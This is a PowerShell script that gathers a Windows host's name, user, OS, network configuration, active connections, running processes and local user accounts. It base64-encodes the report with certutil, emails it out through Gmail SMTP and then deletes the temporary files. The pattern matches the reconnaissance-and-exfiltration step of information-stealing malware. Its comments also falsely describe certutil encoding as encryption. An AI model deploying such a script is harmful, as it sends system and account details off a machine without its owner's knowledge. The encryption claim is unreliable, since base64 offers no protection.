# Set the output file paths and email parameters
$OutputFile = "$env:TEMP\sysinfo_report.txt"
$EncryptedFile = "$env:TEMP\sysinfo_report.txt.enc"
$SmtpServer = "smtp.gmail.com"                # SMTP server for Gmail
$From = ""          # Sender's email
$To = ""             # Recipient's email
$Subject = "System Information Report"
$Body = "Please find the attached encrypted system information report."
$Username = ""      # Gmail username
$Password = ""      # Gmail App Password (ensure it's a valid App Password)

# Gather basic system information and save to a file
"System Report - $(Get-Date)" | Out-File -FilePath $OutputFile
"Computer Name: $env:COMPUTERNAME" | Out-File -FilePath $OutputFile -Append
"User Name: $env:USERNAME" | Out-File -FilePath $OutputFile -Append
"Operating System:" | Out-File -FilePath $OutputFile -Append
(Get-ComputerInfo -Property "CsName", "OsName", "OsArchitecture") | Out-File -FilePath $OutputFile -Append
"Network Configuration:" | Out-File -FilePath $OutputFile -Append
(ipconfig /all) | Out-File -FilePath $OutputFile -Append
"Active Network Connections:" | Out-File -FilePath $OutputFile -Append
(netstat -a) | Out-File -FilePath $OutputFile -Append
"Running Tasks:" | Out-File -FilePath $OutputFile -Append
(tasklist) | Out-File -FilePath $OutputFile -Append
"User Accounts:" | Out-File -FilePath $OutputFile -Append
(net user) | Out-File -FilePath $OutputFile -Append

# Encrypt the output file
certutil -encode $OutputFile $EncryptedFile

# Setup the SMTP client and send the email with the encrypted file attached
$Message = New-Object System.Net.Mail.MailMessage
$Message.From = $From
$Message.To.Add($To)
$Message.Subject = $Subject
$Message.Body = $Body
$Message.Attachments.Add($EncryptedFile)

$SMTP = New-Object Net.Mail.SmtpClient($SmtpServer, 587)  # Port 587 for TLS
$SMTP.EnableSsl = $true
$SMTP.Credentials = New-Object System.Net.NetworkCredential($Username, $Password)

# Send the email
try {
    $SMTP.Send($Message)
    Write-Output "Email sent successfully with the encrypted system information report!"
} catch {
    Write-Output "Failed to send email: $_"
}

# Clean up temporary files
Remove-Item $OutputFile
Remove-Item $EncryptedFile
